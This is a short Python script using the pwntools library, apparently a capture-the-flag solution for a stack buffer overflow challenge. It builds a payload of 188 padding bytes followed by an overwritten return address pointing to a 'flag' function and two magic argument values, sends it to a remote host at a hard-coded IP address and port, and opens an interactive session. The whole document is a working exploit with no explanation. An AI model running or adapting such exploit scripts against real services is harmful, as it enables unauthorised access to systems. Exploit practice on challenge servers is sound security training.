

from pwn import *

flag = 0x080491e2
host = "139.59.166.56"
port =  32005
deadbeef = 0xdeadbeef
codedood = 0xc0ded00d

payload = b"A"*188 + p32(flag)+ b"A"*4 + p32(deadbeef) + p32(codedood)

p = remote(host,port)
p.sendline(payload)
p.interactive()


